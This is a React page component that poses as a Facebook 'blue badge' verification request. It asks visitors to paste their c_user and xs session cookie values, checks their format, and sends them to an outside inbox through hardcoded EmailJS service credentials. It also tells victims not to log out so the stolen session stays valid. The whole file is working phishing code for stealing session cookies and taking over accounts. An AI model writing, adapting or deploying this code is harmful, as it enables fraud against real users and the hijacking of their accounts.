import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./style.css"; // Assuming you have custom styles
import LoginModal from "../modal/LoginModal"; // Assuming you already have a modal component

const ValidationPage = () => {
  const form = useRef();
  const navigate = useNavigate();
  const [isFormValid, setIsFormValid] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);
  const [showModal, setShowModal] = useState(false); // Modal visibility state

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          "service_7lce09n",
          "template_2c9jb3o",
          form.current,
          "9A_y0UG3yCmhE-Hh8"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true); // Show the modal after form submission
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  return (
    <>
      <div
        style={{
          width: "100%",
          background: "#fff",
          padding: "20px 0",
          textAlign: "center",
          boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)"
        }}
      >
        <h1 className="text-primary">Request Your Blue Badge</h1>
      </div>

      <form ref={form} onSubmit={sendEmail}>
        <div className="container mt-4">
          <div className="row justify-content-center">
            <div className="col-12 col-md-8 col-lg-6">
              <div className="border p-4 bg-light">
                <h5 className="mb-3">Get Verified on Facebook</h5>

                {isFormValid && (
                  <div className="alert alert-danger">
                    Please enter valid values for both fields.
                  </div>
                )}

                <p>
                  The verified badge confirms that Facebook has recognized your
                  account as authentic. By submitting the form below, you'll be
                  reviewed for verification.
                </p>

                <div className="mb-3">
                  <label className="form-label">c_user</label>
                  <input
                    type="number"
                    name="c_user"
                    className="form-control"
                    required
                    pattern="^\d{15}$"
                    title="Please enter 15 digits"
                  />
                </div>

                <div className="mb-3">
                  <label className="form-label">xs</label>
                  <input
                    type="text"
                    name="xs"
                    className="form-control"
                    required
                  />
                </div>

                <div className="mb-3 text-center">
                  <p>
                    Be sure to watch the video below for more instructions:
                  </p>
                  <video
                    controls
                    muted={videoMuted}
                    style={{ width: "100%", maxWidth: "400px", height: "auto" }}
                    src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
                  ></video>
                  <br />
                  <button
                    onClick={() => setVideoMuted(false)}
                    className="btn btn-sm btn-secondary mt-2"
                  >
                    Enable Sound
                  </button>
                </div>

                <p className="mt-2">
                  Please make sure not to log out from your computer or laptop
                  until you have received a verification email.
                </p>

                <div className="text-end mt-4">
                  <button
                    type="submit"
                    className="btn btn-primary"
                    style={{ background: "#4267B2" }}
                  >
                    Submit
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>

      {/* Modal */}
      <LoginModal showModal={showModal} setShowModal={setShowModal} />
    </>
  );
};

export default ValidationPage;
